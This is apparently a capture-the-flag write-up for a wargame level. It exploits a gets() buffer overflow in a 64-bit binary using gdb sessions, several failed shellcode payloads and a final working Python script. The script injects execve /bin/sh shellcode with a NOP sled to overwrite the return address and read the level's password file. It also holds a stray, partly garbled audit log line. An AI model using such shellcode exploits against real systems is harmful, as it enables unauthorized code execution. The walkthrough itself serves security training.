## Infos on the binary

```shell
level00@rainfall:~$ checksec case
[*] '/home/level00/case'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found # Overflow possible
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000) # Fixed address
    Stack:      Executable # We can execute code on the stack
    RWX:        Has RWX segments # We can write shellcode in the stack
    SHSTK:      Enabled # Shadow Stack : 
    IBT:        Enabled
    Stripped:   No
```

```shell
level00@rainfall:~$ objdump -R ./case
./case:     file format elf64-x86-64
```
The binary is a 64 bits ELF file.
There is the `auth_loop` function calling gets() which reads from an input, and allocate 64 bytes. But it is known to be unsafe because of the lack of the buffer size control. So we can use this function to overflow the buffer and fill the stack with a payload we need.

## Tests

There are no calls to `exec('/bin/sh')` or other system calls in the binary.

We can use gdb without the env vars here: `env -i gdb case`

![alt text](<./ressources/gets_ghidra.png>)

We want to find the address of the buffer allocated by gets() to write our shellcode in it. We can do that by setting a breakpoint on the `gets` call and printing the value of the `rdi` register which contains the address of the input buffer.

```shell
env -i gdb -q case
(gdb) b *0x401596 #gets call
(gdb) run
(gdb) c
AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401630 in auth_loop ()
```

This segfault return is bad because it is stuck in the `auth_loop` ret because of the ShadowStack. So we can't use this method to find the buffer address as in the previous Rainfall version. So the ret2shellcode method is not possible here. We need to find another way to get the buffer address.

To see the buffer address, we can use gdb to print the value of the `rdi` register after the `gets` call. This will give us the address of the buffer allocated by `gets()`.

```shell
env -i gdb -q case
(gdb) b *0x401596 #gets call
(gdb) run
(gdb) p/x $rdi
$1 = 0x7fffffffec60
```

```shell
gdb -nx -q case # Here -nx disables the gdbinit file, allowing to start correctly with env
(gdb) b *0x401596 #gets call
(gdb) run
(gdb) p/x $rdi
$1 = 0x7fffffffe210

```

```shell
00401596 e8 c5 fb        CALL   <EXTERNAL>::gets                 char * gets(char * __s)
            ff ff
0040159b 48 8d 45 b0     LEA    RAX=>local_58,[RBP + -0x50]
```
RAX is the return value of gets(), and it is located at RBP-0x50 (80 bytes), 

Now, we need to find a way to write our shellcode into this buffer.

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*88 + b"\x60\xec\xff\xff\xff\x7f\x00\x00" + b"\n")' > /tmp/t
env -i gdb ./case
r < /tmp/t

Offset 88  -> 66 shellcode -> 88-66 = 22 padding

python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*22 + b"\xeb\x22\x5e\x8d\x7e\x0d\x31\xdb\x31\xc9\xf7\xe1\x89\xe2\xb1\x0d\x8a\x1e\x4b\x88\x1c\x02\x40\x8a\x1f\x4b\x88\x1c\x02\x40\x46\x47\xe2\xee\xff\xe2\xe8\xd9\xff\xff\xff\x32\x51\x30\x74\x69\x63\x6f\xe4\x8a\x54\xe2\x0c\x81\xc1\x69\x30\x69\x30\x6a\x8a\x51\xe3\x8a\xb1\xce" +  b"\x60\xec\xff\xff\xff\x7f\x00\x00")' > /tmp/t

Not working, this is a 32 bits shellcode, we need a 64 bits shellcode.

(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*22 + b"\xeb\x22\x5e\x8d\x7e\x0d\x31\xdb\x31\xc9\xf7\xe1\x89\xe2\xb1\x0d\x8a\x1e\x4b\x88\x1c\x02\x40\x8a\x1f\x4b\x88\x1c\x02\x40\x46\x47\xe2\xee\xff\xe2\xe8\xd9\xff\xff\xff\x32\x51\x30\x74\x69\x63\x6f\xe4\x8a\x54\xe2\x0c\x81\xc1\x69\x30\x69\x30\x6a\x8a\x51\xe3\x8a\xb1\xce" +  b"\x60\xec\xff\xff\xff\x7f\x00\x00")'; cat) | ./case

Not working either

(python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x48\xc7\xc0\x2d\x70\x00\x00\x50\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05" + b"\x90"*47 +b"\x60\xec\xff\xff\xff\x7f\x00\x00")'; cat) | ./case

Not working either

(python3 -c 'import sys; sys.stdout.buffer.write(b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x48\xc7\xc0\x2d\x70\x00\x00\x50\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05" + b"\x90"*47 +b"\x10\xe2\xff\xff\xff\x7f\x00\x00")'; cat) | ./case

### Looking deepper inside memory

[SPRAWL//NET] Audit: [1790674743] user=�����������������������������������������������H1�RH�/bin/sh status=FAIL

```shell
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffeca9 in ?? ()
(gdb) info register rip rsp rbp
rip            0x7fffffffe33a      0x7fffffffe33a
rsp            0x7fffffffe270      0x7fffffffe270
rbp            0x9090909090909090  0x9090909090909090 <- NOP sled
```

```shell
(gdb) x/80bx 0x7fffffffeca0
0x7fffffffeca0:	0xe7	0x52	0x48	0xc7	0xc0	0x2d	0x70	0x00 <- shellcode
0x7fffffffeca8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffecb0:	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68	0x00
0x7fffffffecb8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffecc0:	0x00	0xed	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffecc8:	0xca	0xa1	0xc2	0xf7	0xff	0x7f	0x00	0x00
0x7fffffffecd0:	0x10	0xed	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffecd8:	0xe8	0xed	0xff	0xff	0xff	0x7f	0x00	0x00
0x7fffffffece0:	0x40	0x00	0x40	0x00	0x01	0x00	0x00	0x00
0x7fffffffece8:	0x31	0x16	0x40	0x00	0x00	0x00	0x00	0x00
```

```python
import struct, sys
sc = b"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x52\x48\xc7\xc0\x2d\x70\x00\x00\x50\x48\x89\xe6\x52\x56\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05"

buf = 0x7fffffffe210 # Address of the buffer allocated by gets()
filler = b"\x90"*88 # 88 bytes of padding to fill the buffer and reach the return address
retaddr = struct.pack("<Q", buf + 296) # Overwrite the return address (RIP) with the address of the buffer + 296 bytes (to land in the NOP sled)
sled = b"\x90"*200 # 200 bytes of NOP sled to ensure we land in the shellcode.The number of bytes can be adjusted based on the size of the shellcode and the buffer.
payload =  filler + retaddr + sled + sc + b"\n"
sys.stdout.buffer.write(payload)
```

```shell
(python3 prog.py; cat) | ./case
...
cat /home/flag00/.pass
czugaihitjx0lys47blkh0qwtzz1c9g6
```